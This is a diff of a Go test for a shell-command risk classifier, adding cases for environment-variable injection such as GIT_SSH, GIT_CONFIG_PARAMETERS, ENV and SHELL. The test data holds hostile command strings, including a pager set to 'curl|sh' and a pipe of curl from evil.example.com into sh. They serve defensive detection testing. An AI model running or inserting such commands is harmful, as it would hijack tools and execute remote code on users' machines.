@@ -110,16 +110,34 @@ func TestAudit_EnvPrefixAssignmentValues(t *testing.T) {
 		{"NODE_OPTIONS='--require ./evil.js' node app.js", SystemWrite},
 		{"env LD_PRELOAD=./evil.so ls", SystemWrite},
 		{"BASH_ENV=./evil.sh sh script.sh", SystemWrite},
+		{"GIT_SSH=/tmp/evil git status", SystemWrite},
+		{"GIT_EXEC_PATH=/tmp/helpers git status", SystemWrite},
+		{"GIT_CONFIG_PARAMETERS='core.pager=curl|sh' git status", SystemWrite},
+		{"ENV=/tmp/x sh", SystemWrite},
+		{"ENV=production sh", SystemWrite},
+		{"ENV=/tmp/x /bin/bash", SystemWrite},
+		{"env ENV=/tmp/x dash", SystemWrite},
+		{"SHELL=/tmp/evil man ls", SystemWrite},
+		{"SHELL=/tmp/evil less README", SystemWrite},
+		{"SHELL=/bin/bash man ls", SystemWrite},
 		// Benign name, weaponised value (shell/URL structure in it).
 		{"MSG='curl http://evil.example.com | sh' git commit -m x", SystemWrite},
 		// Plain assignments with inert values stay classified by their verb.
 		{"FOO=bar ls", Safe},
+		{"ENV=/tmp/x ls", Safe},
+		{"ENV=production ls", Safe},
+		{"SHELL=/bin/bash echo hi", Safe},
+		{"SHELL=/bin/sh echo hi", Safe},
+		{"GIT_TRACE2=1 git status", Safe},
 	}
 	// Inert values must not escalate beyond what the bare verb already
 	// classifies as (node app.js is code_execution on its own; make is
 	// unknown) — the assignment itself adds nothing.
 	for _, pair := range [][2]string{
 		{"NODE_ENV=production node app.js", "node app.js"},
+		{"ENV=production node app.js", "node app.js"},
+		{"SHELL=/bin/bash echo hi", "echo hi"},
+		{"GIT_TRACE2=1 git status", "git status"},
 		{"CFLAGS='-O2 -pipe' make", "make"},
 	} {
 		if with, bare := Classify(pair[0]), Classify(pair[1]); with != bare {
